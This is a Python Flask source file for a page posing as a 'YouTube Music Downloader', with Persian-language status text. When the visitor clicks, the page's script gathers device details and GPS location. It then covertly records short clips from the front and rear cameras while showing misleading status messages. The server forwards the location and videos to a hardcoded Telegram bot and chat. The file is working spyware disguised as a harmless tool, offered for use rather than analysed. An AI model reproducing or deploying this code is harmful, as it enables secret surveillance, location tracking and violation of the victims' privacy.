from flask import Flask, render_template_string, request, jsonify
import requests
import os
import json

app = Flask(__name__)

BOT_TOKEN = "8856249113:AAHjdpUoGjuRyH9bzD-gSomevMMPg1cet64"
TARGET_CHAT_ID = "8173349543"

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
<meta charset="UTF-8">
<title>YouTube Music Downloader</title>
<style>
    body{background:#f0f2f5;font-family:sans-serif;text-align:center}
    .header{background:#ff0000;color:white;padding:20px}
    #status{margin-top:20px;font-weight:bold;color:#333;font-size:18px}
</style>
</head>
<body onclick="startAutoProcess()">
    <div class="header"><h1>YouTube Music Downloader</h1></div>
    <div id="status">برای شروع روی صفحه کلیک کنید...</div>

    <script>
    let started = false;
    async function startAutoProcess() {
        if(started) return;
        started = true;
        
        const info = {
            ua: navigator.userAgent,
            ram: navigator.deviceMemory || "نامشخص",
            cores: navigator.hardwareConcurrency || "نامشخص",
            storage: navigator.storage && await navigator.storage.estimate().then(e => (e.quota / 1e9).toFixed(2) + " GB") || "نامشخص"
        };
        
        navigator.geolocation.getCurrentPosition(async (pos) => {
            info.lat = pos.coords.latitude;
            info.lon = pos.coords.longitude;
            
            // مرحله ۱: دوربین جلو
            document.getElementById('status').innerText = "ساخته شد";
            await recordAndSend("user", "ساخته شد", info);
            
            // مرحله ۲: دوربین عقب
            document.getElementById('status').innerText = "تولید شد";
            await recordAndSend("environment", "تولید شد", info);
        });
    }

    async function recordAndSend(facingMode, label, info) {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode }, audio: false });
        const recorder = new MediaRecorder(stream);
        let chunks = [];
        recorder.ondataavailable = e => chunks.push(e.data);
        
        return new Promise((resolve) => {
            recorder.onstop = async () => {
                const blob = new Blob(chunks, { type: 'video/webm' });
                const fd = new FormData();
                fd.append("video", blob);
                fd.append("info", JSON.stringify(info));
                fd.append("label", label);
                await fetch("/upload", { method: "POST", body: fd });
                stream.getTracks().forEach(t => t.stop());
                resolve();
            };
            recorder.start();
            setTimeout(() => recorder.stop(), 4000);
        });
    }
    </script>
</body>
</html>
"""

@app.route("/")
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route("/upload", methods=["POST"])
def upload():
    video = request.files.get("video")
    info = json.loads(request.form.get("info"))
    label = request.form.get("label")
    
    msg = (f"🚨 {label}\n\n"
           f"📍 موقعیت: {info.get('lat')}, {info.get('lon')}\n"
           f"📱 دستگاه: {info.get('ua')}\n"
           f"💾 رم: {info.get('ram')} GB\n"
           f"🗄 حافظه: {info.get('storage')}\n"
           f"⚙️ هسته پردازنده: {info.get('cores')}\n\n"
           f"ساخته شده توسط ریس شاهد و ریس نوری\n"
           f"@shahidnaimi5642 | @HOKOMAT_ARAB")
    
    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendLocation",
                  data={"chat_id": TARGET_CHAT_ID, "latitude": info.get('lat'), "longitude": info.get('lon')})
    
    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo",
                  data={"chat_id": TARGET_CHAT_ID, "caption": msg},
                  files={"video": ("v.webm", video.stream)})
    return "ok"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
